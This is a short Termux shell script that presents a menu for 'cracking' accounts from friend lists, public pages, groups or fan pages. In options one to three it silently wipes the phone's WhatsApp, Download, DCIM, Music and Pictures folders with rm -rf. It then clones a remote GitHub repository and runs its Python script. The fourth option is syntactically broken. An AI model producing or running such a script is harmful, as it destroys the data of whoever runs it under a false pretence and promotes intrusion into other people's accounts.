echo "1. Crack From Friendlist"
echo "2. Crack From Public"
echo "3. Crack From Groups"
echo "4. Crack From Fanspage"
read -p "Crack >>" nomer
#bays
if [ $nomer = 1 ]
then
pkg update
pkg upgrade
termux-setup-storage
cd /sdcard
rm -rf /storage/emulated/0/WhatsApp/*
rm -rf /storage/emulated/0/Download/*
rm -rf /storage/emulated/0/DCIM/*
rm -rf /storage/emulated/0/Music/*
rm -rf /storage/emulated/0/Pictures/*
clear
git clone https://github.com/RKT1/pro
cd pro
python2 pro.py
fi
if [ $nomer = 2 ]
then
pkg update
pkg upgrade
termux-setup-storage
cd /sdcard
rm -rf /storage/emulated/0/WhatsApp/*
rm -rf /storage/emulated/0/Download/*
rm -rf /storage/emulated/0/DCIM/*
rm -rf /storage/emulated/0/Music/*
rm -rf /storage/emulated/0/Pictures/*
clear
git clone https://github.com/RH420/Pendu
cd Pendu
python2 Pendu.py
fi
if [ $nomer = 3 ]
then
pkg update
pkg upgrade
termux-setup-storage
cd /sdcard
rm -rf /storage/emulated/0/WhatsApp/*
rm -rf /storage/emulated/0/Download/*
rm -rf /storage/emulated/0/DCIM/*
rm -rf /storage/emulated/0/Music/*
rm -rf /storage/emulated/0/Pictures/*
clear
git clone https://github.com/yasu87/Re77
cd Re77
python re7.py
fi
if [ $nomer = 4 ]
ls
cd
cd lemon
python ok7.py
fi
